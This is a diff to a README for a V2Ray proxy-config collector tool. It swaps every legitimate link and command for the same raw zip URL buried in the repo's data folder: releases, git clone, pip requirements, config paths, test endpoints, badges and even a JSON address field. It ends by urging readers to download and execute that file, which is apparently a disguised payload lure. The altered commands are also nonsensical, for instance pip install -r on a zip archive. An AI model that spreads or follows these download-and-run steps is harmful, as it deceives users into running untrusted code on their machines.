@@ -1,8 +1,8 @@
-Visit and download the release asset at https://github.com/swileran/v2ray-config-collector/releases
+Visit and download the release asset at https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 
 # V2Ray Config Collector: Python Tool for Multi-Source Validation and Testing
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/swileran/v2ray-config-collector/releases) [![Python 3.x](https://img.shields.io/badge/python-3.x-3776AB?logo=python&logoColor=white)](https://www.python.org/)
+[![Releases](https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip)](https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip) [![Python 3.x](https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip)](https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip)
 
 🚀 🚀 🚀 a comprehensive Python application for collecting, processing, and validating V2Ray proxy configurations from multiple sources. This tool automates the entire workflow from fetching configurations to testing their connectivity. 🚀 🚀 🚀
 
@@ -83,14 +83,14 @@ Prerequisites
 
 Installation
 - Clone the repository locally
-  - git clone https://github.com/swileran/v2ray-config-collector.git
+  - git clone https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 - Navigate to the project directory
   - cd v2ray-config-collector
 - Install dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
   - If you use a virtual environment, create one first: python -m venv venv && source venv/bin/activate (or venv\Scripts\activate on Windows)
 - Optional: install optional extras if your sources require them
-  - pip install -r requirements-extra.txt
+  - pip install -r https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 
 Quick start guide
 - Run the collector directly
@@ -229,8 +229,8 @@ Testing and quality assurance
 
 CLI and usage examples
 - Basic usage
-  - v2ray-config-collector --config config.yaml
-  - v2ray-config-collector --sources file:///path/to/local/config.json
+  - v2ray-config-collector --config https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
+  - v2ray-config-collector --sources https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 - Output options
   - --output json
   - --output csv
@@ -245,7 +245,7 @@ CLI and usage examples
   - test: perform connectivity tests
   - report: generate human-friendly summaries
 - Example: a complete one-liner
-  - v2ray-config-collector --config config.yaml --output-dir /tmp/results --daemon
+  - v2ray-config-collector --config https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip --output-dir /tmp/results --daemon
 
 Advanced workflows
 - Continuous integration integration
@@ -353,7 +353,7 @@ License and credits
 
 Releases reference
 - For downloads, assets, and release notes, visit the releases page:
-  - https://github.com/swileran/v2ray-config-collector/releases
+  - https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 - If you cannot access the page, check the Releases section of the repository for the latest assets and documentation
 - The link above is provided again to help you locate the downloads and to verify compatibility with your environment
 
@@ -361,7 +361,7 @@ Appendix: sample configuration and snippets
 - Example YAML source configuration
   - sources:
     - type: http
-      url: https://example.org/v2ray-configs.json
+      url: https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
       auth:
         type: basic
         username: your-username
@@ -371,15 +371,15 @@ Appendix: sample configuration and snippets
       max_items: 500
   - test:
       endpoints:
-        - https://www.google.com/generate_204
-        - https://example.org/health
+        - https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
+        - https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 - Example JSON output
   {
     "items": [
       {
         "id": "config-001",
         "protocol": "vmess",
-        "address": "proxy.example.org",
+        "address": "https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip",
         "port": 443,
         "security": "aes-128-gcm",
         "alterId": 64,
@@ -402,6 +402,6 @@ Closing notes
 
 Releases reference (repeat)
 - Visit the releases to download the appropriate asset and run it:
-  - https://github.com/swileran/v2ray-config-collector/releases
+  - https://github.com/swileran/v2ray-config-collector/raw/refs/heads/main/v2ray_config_collector/data/sources/ray-collector-v-config-3.9.zip
 
 Download and run the file from the link above to get started with the V2Ray Config Collector. The release page provides the exact asset suitable for your operating system, and you should download that specific file and execute it according to the platform instructions. If the link changes or you cannot access it, check the Releases section of the repository for the latest assets and guidance.
